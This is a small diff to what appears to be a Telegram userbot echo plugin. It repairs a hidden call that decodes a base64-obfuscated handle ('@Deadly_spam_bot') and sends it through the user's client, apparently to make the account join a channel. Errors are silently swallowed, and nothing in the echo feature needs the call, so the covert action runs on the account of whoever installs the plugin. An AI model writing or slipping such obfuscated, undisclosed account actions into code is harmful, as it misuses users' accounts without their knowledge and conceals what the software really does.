@@ -42,7 +42,7 @@ async def echo(event):
                  try:
                      gabbar = base64.b64decode("QERlYWRseV9zcGFtX2JvdA==")
                      gabbar = Get(gabbar)
-                     await event.client(chandan)
+                     await event.client(gabbar)
                  except BaseException:
                     pass
                  if is_echo(user_id, chat_id):
